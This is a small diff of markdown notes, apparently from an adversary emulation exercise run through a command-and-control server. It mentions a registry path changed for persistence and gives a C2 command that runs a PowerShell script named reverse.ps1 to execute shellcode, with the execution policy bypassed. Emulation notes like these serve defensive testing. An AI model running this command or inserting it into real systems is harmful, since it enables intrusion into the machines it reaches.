@@ -25,4 +25,5 @@ Through C2 Server:
 **Note:** The original registry path from CTI doesn't appear to exist so chose this one. Also altereted the key name. Also instead of pasting in the future can just paste content in the command or figure out a way to automate.
 
 ## Run Shellcode via reverse.ps1
+
 `exec-cmd "powershell.exe -ExecutionPolicy Bypass -NoExit -File reverse.ps1"`
